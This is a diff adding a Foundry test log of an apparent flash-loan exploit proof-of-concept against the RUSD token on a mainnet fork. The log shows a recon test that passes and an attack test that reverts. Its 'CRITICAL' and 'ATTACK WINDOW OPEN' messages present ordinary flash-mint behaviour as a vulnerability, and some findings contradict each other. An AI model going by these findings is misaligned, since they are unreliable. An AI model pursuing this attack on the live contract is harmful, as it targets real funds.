@@ -1,0 +1,144 @@
+Compiling 1 files with Solc 0.8.33
+Solc 0.8.33 finished in 386.29ms
+Compiler run successful with warnings:
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> test/PoC_Resolv_FlashLoan.t.sol:69:9:
+   |
+69 |         address token,
+   |         ^^^^^^^^^^^^^
+
+
+Ran 2 tests for test/PoC_Resolv_FlashLoan.t.sol:PoC_Resolv_FlashLoan
+[FAIL: ERC20: transfer amount exceeds balance] test_flashLoan_execute() (gas: 113594)
+Logs:
+  === FLASH LOAN EXECUTION ===
+  Borrowing (RUSD)  : 12914
+  Fee (RUSD)        : 11
+  Supply before     : 12914
+  --- INSIDE FLASH LOAN ---
+  Borrowed (RUSD)       : 12914
+  Fee (RUSD)            : 11
+  Our balance mid-loan  : 12914
+  Total supply mid-loan : 25829
+  ATTACK WINDOW OPEN - full supply in attacker control
+
+Traces:
+  [5586] PoC_Resolv_FlashLoan::setUp()
+    ├─ [0] VM::envString("ETH_RPC_URL") [staticcall]
+    │   └─ ← [Return] <env var value>
+    ├─ [0] VM::createSelectFork("<rpc url>")
+    │   └─ ← [Return] 1
+    ├─ [0] VM::label(RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], "RUSD")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [113594] PoC_Resolv_FlashLoan::test_flashLoan_execute()
+    ├─ [2405] RUSD::totalSupply() [staticcall]
+    │   └─ ← [Return] 12914534451302647155823 [1.291e22]
+    ├─ [712] RUSD::flashFee(RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], 12914534451302647155823 [1.291e22]) [staticcall]
+    │   └─ ← [Return] 11623081006172382440 [1.162e19]
+    ├─ [0] console::log("=== FLASH LOAN EXECUTION ===") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Borrowing (RUSD)  :", 12914 [1.291e4]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Fee (RUSD)        :", 11) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [405] RUSD::totalSupply() [staticcall]
+    │   └─ ← [Return] 12914534451302647155823 [1.291e22]
+    ├─ [0] console::log("Supply before     :", 12914 [1.291e4]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [75626] RUSD::flashLoan(PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], 12914534451302647155823 [1.291e22], 0x)
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 12914534451302647155823 [1.291e22])
+    │   ├─ [35506] PoC_Resolv_FlashLoan::onFlashLoan(PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], 12914534451302647155823 [1.291e22], 11623081006172382440 [1.162e19], 0x)
+    │   │   ├─ [0] console::log("--- INSIDE FLASH LOAN ---") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("Borrowed (RUSD)       :", 12914 [1.291e4]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("Fee (RUSD)            :", 11) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [620] RUSD::balanceOf(PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 12914534451302647155823 [1.291e22]
+    │   │   ├─ [0] console::log("Our balance mid-loan  :", 12914 [1.291e4]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [405] RUSD::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 25829068902605294311646 [2.582e22]
+    │   │   ├─ [0] console::log("Total supply mid-loan :", 25829 [2.582e4]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("ATTACK WINDOW OPEN - full supply in attacker control") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [24653] RUSD::approve(RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], 12926157532308819538263 [1.292e22])
+    │   │   │   ├─ emit Approval(owner: PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], value: 12926157532308819538263 [1.292e22])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9
+    │   ├─ emit Approval(owner: PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], value: 0)
+    │   ├─ emit Transfer(from: PoC_Resolv_FlashLoan: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 12914534451302647155823 [1.291e22])
+    │   ├─ [2359] PrismaCore::feeReceiver() [staticcall]
+    │   │   └─ ← [Return] 0xfdCE0267803C6a0D209D3721d2f01Fd618e9CBF8
+    │   └─ ← [Revert] ERC20: transfer amount exceeds balance
+    └─ ← [Revert] ERC20: transfer amount exceeds balance
+
+Backtrace:
+  at RUSD.flashLoan
+  at PoC_Resolv_FlashLoan.test_flashLoan_execute
+
+[PASS] test_recon() (gas: 25715)
+Logs:
+  ======= RESOLV RUSD RECON =======
+  Total Supply (RUSD)  : 12914
+  maxFlashLoan is MAX  : false
+  Flash fee on 1M RUSD : 900 RUSD
+  Fee rate (bps)       : 9
+  BorrowerOps          : 0xeCabcF7d41Ca644f87B25704cF77E3011D9a70a1
+  StabilityPool        : 0x6953504F2f4537D7a7B4024508f321f7816BB6ED
+  =================================
+  CRITICAL: Supply only 12914 RUSD
+  CRITICAL: Flash loan uncapped (uint256.max)
+  CRITICAL: Can borrow 1291453 x supply via flash loan
+
+Traces:
+  [25715] PoC_Resolv_FlashLoan::test_recon()
+    ├─ [2405] RUSD::totalSupply() [staticcall]
+    │   └─ ← [Return] 12914534451302647155823 [1.291e22]
+    ├─ [721] RUSD::maxFlashLoan(RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0]) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564026543049556610482484112 [1.157e77]
+    ├─ [712] RUSD::flashFee(RUSD: [0x35282d87011f87508D457F08252Bc5bFa52E10A0], 1000000000000000000000000 [1e24]) [staticcall]
+    │   └─ ← [Return] 900000000000000000000 [9e20]
+    ├─ [349] RUSD::borrowerOperationsAddress() [staticcall]
+    │   └─ ← [Return] 0xeCabcF7d41Ca644f87B25704cF77E3011D9a70a1
+    ├─ [307] RUSD::stabilityPoolAddress() [staticcall]
+    │   └─ ← [Return] 0x6953504F2f4537D7a7B4024508f321f7816BB6ED
+    ├─ [0] console::log("======= RESOLV RUSD RECON =======") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Total Supply (RUSD)  :", 12914 [1.291e4]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("maxFlashLoan is MAX  :", false) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Flash fee on 1M RUSD :", 900, "RUSD") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Fee rate (bps)       :", 9) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("BorrowerOps          :", 0xeCabcF7d41Ca644f87B25704cF77E3011D9a70a1) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("StabilityPool        :", 0x6953504F2f4537D7a7B4024508f321f7816BB6ED) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("=================================") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("CRITICAL: Supply only", 12914 [1.291e4], "RUSD") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("CRITICAL: Flash loan uncapped (uint256.max)") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("CRITICAL: Can borrow", 1291453 [1.291e6], "x supply via flash loan") [staticcall]
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: FAILED. 1 passed; 1 failed; 0 skipped; finished in 4.08s (2.25s CPU time)
+
+Ran 1 test suite in 10.86s (4.08s CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/PoC_Resolv_FlashLoan.t.sol:PoC_Resolv_FlashLoan
+[FAIL: ERC20: transfer amount exceeds balance] test_flashLoan_execute() (gas: 113594)
+
+Encountered a total of 1 failing tests, 1 tests succeeded
+
+Tip: Run `forge test --rerun` to retry only the 1 failed test
